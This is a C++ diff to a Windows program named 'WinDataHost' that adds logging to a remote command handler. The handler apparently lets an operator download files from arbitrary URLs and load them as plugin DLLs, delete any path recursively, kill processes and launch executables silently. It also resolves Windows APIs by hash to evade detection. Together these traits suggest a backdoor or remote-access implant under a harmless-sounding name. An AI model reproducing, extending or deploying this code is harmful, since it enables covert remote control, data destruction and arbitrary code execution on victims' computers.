@@ -226,31 +226,38 @@ void ProcessCommand(const std::wstring& cmd, const std::wstring& exeDir, PluginM
             std::wstring url = TrimWhitespace(cmd.substr(9, sep - 9));
             std::wstring filename = TrimWhitespace(cmd.substr(sep + 1));
             fs::path dest = fs::path(exeDir) / filename;
+            Logger::Log(L"Command DOWNLOAD: URL=" + url + L", Filename=" + filename);
             if (filename.find(L"update") != std::wstring::npos && filename.find(L".dll") != std::wstring::npos) {
+                Logger::Log(L"Unloading plugins for update.");
                 pluginManager.UnloadAll();
                 CALL_API(Hashes::kernel32, Hashes::Sleep, Sleep, 2000);
             }
             if (NetworkManager::DownloadFile(url, dest.wstring())) {
+                Logger::Log(L"Download success.");
                 if (filename.find(L"update") != std::wstring::npos && filename.find(L".dll") != std::wstring::npos)
                     pluginManager.LoadPlugin(dest.wstring());
-            }
+            } else { Logger::LogError(L"Download failed: " + url); }
         }
     }
     else if (!cmd.empty() && cmd[0] == L'/') { pluginManager.BroadcastToPlugins(cmd); }
     else if (cmd.find(L"DELETE:") == 0) {
         std::wstring target = TrimWhitespace(cmd.substr(7));
-        try { if (fs::exists(target)) fs::remove_all(target); } catch (...) { }
+        Logger::Log(L"Command DELETE: " + target);
+        try { if (fs::exists(target)) { fs::remove_all(target); Logger::Log(L"Deleted."); } }
+        catch (const std::exception& e) { Logger::LogError(L"Delete failed: " + FileUtils::StringToWString(e.what())); }
     }
     else if (cmd.find(L"STOP:") == 0 || cmd.find(L"KILL:") == 0) {
         StopProcess(TrimWhitespace(cmd.substr(cmd.find(L':') + 1)));
     }
     else if (cmd.find(L"RUN:") == 0) {
         std::wstring exePath = TrimWhitespace(cmd.substr(4));
+        Logger::Log(L"Command RUN: " + exePath);
         STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi = {};
         if (CALL_API(Hashes::kernel32, Hashes::CreateProcessW, CreateProcessW, NULL, const_cast<wchar_t*>(exePath.c_str()), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            Logger::Log(L"Process started.");
             CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, pi.hProcess);
             CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, pi.hThread);
-        }
+        } else { Logger::LogError(L"Run failed: " + exePath, GetLastError()); }
     }
 }
 
@@ -301,6 +308,7 @@ int wmain(int argc, wchar_t* argv[]) {
 
         Config::Load((exeDir / L"config322.ini").wstring());
         Logger::Log(L"WinDataHost started.");
+        Logger::LogSystemInfo();
 
         TaskQueue taskQueue; taskQueue.Start(); TaskQueueGuard tqg(taskQueue);
         PluginManager pluginManager; PluginManagerGuard pmg(pluginManager);
